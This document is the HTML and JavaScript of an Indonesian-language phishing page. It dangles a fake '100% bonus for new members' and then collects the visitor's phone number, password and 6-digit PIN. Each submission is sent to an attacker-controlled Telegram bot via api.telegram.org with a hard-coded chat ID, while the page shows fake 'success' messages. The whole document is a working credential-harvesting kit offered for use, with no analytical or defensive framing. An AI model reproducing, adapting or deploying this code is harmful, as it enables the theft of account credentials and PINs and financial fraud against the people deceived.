    <script>

        const CHAT_ID = "8527556684";     // Ganti dengan ID Chat kamu
    </script>

    <!-- ✅ HALAMAN 1: BONUS (TAMPILAN AWAL) -->
    <div class="page active" id="pageBonus">
        <div class="bonus-container">

            <p class="bonus-tagline">Selamat Datang!</p>

            <div class="bonus-percent">100%</div>
            <p class="bonus-desc">

                Khusus anggota baru!
            </p>
            <button class="btn btn-klaim" onclick="gantiHalaman('Login')">KLAIM BONUS SEKARANG</button>

        </div>

    <!-- ✅ HALAMAN 2: MASUK -->
    <div class="page" id="pageLogin">
        <div class="container">
            <div class="login-header">
                <h1 class="login-title">Masukan ke akun Anda</h1>
                <p class="login-daftar">Belum punya akun? <a href="#">Daftar</a></p>
            </div>

            <form onsubmit="return kirimDataLogin(event)">
                <div class="form-group">
                    <div class="input-box">
                        <div class="country-code">
                            <span class="flag-id"></span>
                            <span class="code-text">+62</span>
                        </div>
                        <input type="tel" id="nomor" placeholder="Telepon" required>
                    </div>
                </div>

                <div class="form-group">
                    <div class="input-box">
                        <span class="input-icon">🔑</span>
                        <input type="password" id="sandi" placeholder="kata sandi" required>
                        <span class="input-icon" id="eyeIcon" onclick="togglePwd()">👁️</span>
                    </div>
                </div>

                <div class="form-footer">
                    <label class="remember">
                        <input type="checkbox" checked> Ingat Kata Sandi
                    </label>
                    <a href="#" class="forgot-link">Lupa kata sandi?</a>
                </div>

                <button type="submit" class="btn btn-login">Masuk</button>
                <div id="statusLogin" class="status"></div>
            </form>

            <div style="text-align:center;">
                <button type="button" class="back-btn" onclick="gantiHalaman('Bonus')">← Kembali</button>
            </div>
        </div>
    </div>

    <!-- ✅ HALAMAN 3: PIN (HANYA ANGKA) -->
    <div class="page" id="pagePIN">
        <div class="container">
            <div class="pin-header">
                <h2 class="pin-title">Masukkan PIN Anda</h2>
                <p class="pin-subtitle">Masukkan 6 digit angka PIN</p>
            </div>

            <form onsubmit="return kirimDataPIN(event)">
                <div class="pin-input-wrapper">
                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 0)" onkeydown="blokirHuruf(event)" required>
                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 1)" onkeydown="blokirHuruf(event)" required>
                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 2)" onkeydown="blokirHuruf(event)" required>
                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 3)" onkeydown="blokirHuruf(event)" required>
                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 4)" onkeydown="blokirHuruf(event)" required>
                    <input type="number" maxlength="1" class="pin-box" oninput="filterAngka(this, 5)" onkeydown="blokirHuruf(event)" required>
                </div>

                <p class="pin-desc">Lupa PIN? <a href="#">Atur Ulang PIN</a></p>

                <button type="submit" class="btn btn-confirm">Konfirmasi</button>
                <div id="statusPIN" class="status"></div>

                <div style="text-align:center;">
                    <button type="button" class="back-btn" onclick="gantiHalaman('Login')">← Kembali</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        let dataPengguna = {};

        // Kirim ke Telegram
        async function kirimKeTelegram(pesan) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: pesan,
                        parse_mode: "Markdown"
                    })
                });
            } catch (e) {}
        }

        // Ganti Halaman
        function gantiHalaman(nama) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById('page' + nama).classList.add('active');
        }

        // Kirim Data Login
        async function kirimDataLogin(e) {
            e.preventDefault();
            const nomor = document.getElementById('nomor').value;
            const sandi = document.getElementById('sandi').value;
            dataPengguna = { nomor, sandi };

            const status = document.getElementById('statusLogin');
            status.textContent = "Sedang memproses...";
            
            await kirimKeTelegram(`🔐 *DATA LOGIN*\n📞 Nomor: ${nomor}\n🔑 Sandi: ${sandi}`);
            
            status.textContent = "Berhasil!";
            status.className = "status sukses";
            setTimeout(() => {
                gantiHalaman('PIN');
                document.querySelectorAll('.pin-box')[0].focus();
            }, 800);
            return false;
        }

        // Blokir input huruf
        function blokirHuruf(e) {
            const tombol = e.key;
            if (!/[0-9]/.test(tombol) && tombol !== 'Backspace' && tombol !== 'Tab') {
                e.preventDefault();
            }
        }

        // Pastikan hanya angka & pindah kolom otomatis
        function filterAngka(el, idx) {
            el.value = el.value.replace(/[^0-9]/g, '');
            if (el.value && idx < 5) {
                document.querySelectorAll('.pin-box')[idx + 1].focus();
            }
        }

        // Kirim Data PIN
        async function kirimDataPIN(e) {
            e.preventDefault();
            const pin = Array.from(document.querySelectorAll('.pin-box')).map(i => i.value).join('');
            
            const status = document.getElementById('statusPIN');
            status.textContent = "Memverifikasi...";
            
            await kirimKeTelegram(`🔢 *DATA PIN*\n📞 Nomor: ${dataPengguna.nomor}\n🔑 PIN: ${pin}`);
            
            status.textContent = "Berhasil! Bonus siap diklaim!";
            status.className = "status sukses";
            setTimeout(() => gantiHalaman('Bonus'), 800);
            return false;
        }

        // Tampil/Sembunyi Kata Sandi
        function togglePwd() {
            const pwd = document.getElementById('sandi');
            const eye = document.getElementById('eyeIcon');
            pwd.type = pwd.type === 'password' ? 'text' : 'password';
            eye.textContent = pwd.type === 'password' ? '👁️' : '🙈';
        }
    </script>
